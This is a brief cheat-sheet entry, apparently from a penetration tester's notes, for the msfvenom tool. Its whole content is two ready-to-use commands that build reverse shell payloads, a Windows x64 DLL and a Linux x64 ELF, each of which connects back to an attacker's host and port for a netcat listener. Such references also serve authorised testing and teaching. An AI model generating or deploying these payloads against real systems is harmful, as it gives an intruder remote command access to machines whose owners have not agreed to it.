# msfvenom
#target/local #os/linux #cat/utils

## Windows reverse shell payload for nc
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport|9001> -f <format|dll> > shell.<format|dll>
```

## Linux reverse shell payload for nc
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport|9001> -f elf -o shell
```
